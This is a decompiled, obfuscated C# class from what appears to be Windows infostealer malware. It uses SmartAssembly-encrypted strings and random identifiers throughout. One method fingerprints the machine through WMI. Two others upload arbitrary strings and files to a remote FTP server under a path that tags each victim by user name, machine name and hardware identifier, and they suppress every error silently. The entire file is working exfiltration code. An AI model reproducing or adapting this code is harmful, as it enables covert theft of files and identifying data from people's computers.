using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GfIOnzejDqtqB;

internal sealed class aOlPpFtnUBXreNv
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string FqqRnlVwFEkGH()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107406019));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107405998)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107406461);
			ManagementObject val3 = new ManagementObject(getString_0(107406456) + text2 + getString_0(107406447));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107406442)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107392220) : text;
		}
	}

	public static void VaQowyqahZf(string sZUfKXdfXaDYY = "URL", string mVNLuFHeRvs = "USERNAME", string NetigyTCAgd = "ACCESO", string cPwpZFTCcgrMlaEX = "")
	{
		try
		{
			string text = FqqRnlVwFEkGH();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(sZUfKXdfXaDYY + getString_0(107407309) + Environment.UserName + getString_0(107407296) + Environment.MachineName + getString_0(107407275) + text + getString_0(107407270));
			ftpWebRequest.Method = getString_0(107406385);
			ftpWebRequest.Credentials = new NetworkCredential(mVNLuFHeRvs, NetigyTCAgd);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(cPwpZFTCcgrMlaEX);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void oHaBhkBqIiP(string dqaIEuglZlbOj = "URL", string XFiCpSOhmCPI = "USERNAME", string jgRtQLKxEwTy = "ACCESO", string oxdvKIMRAVNKz = "")
	{
		try
		{
			string text = FqqRnlVwFEkGH();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(dqaIEuglZlbOj + getString_0(107407309) + Environment.UserName + getString_0(107407296) + Environment.MachineName + getString_0(107407275) + text + getString_0(107407275) + Path.GetFileName(oxdvKIMRAVNKz));
			ftpWebRequest.Method = getString_0(107406385);
			ftpWebRequest.Credentials = new NetworkCredential(XFiCpSOhmCPI, jgRtQLKxEwTy);
			byte[] array = File.ReadAllBytes(oxdvKIMRAVNKz);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static aOlPpFtnUBXreNv()
	{
		Strings.CreateGetStringDelegate(typeof(aOlPpFtnUBXreNv));
	}
}
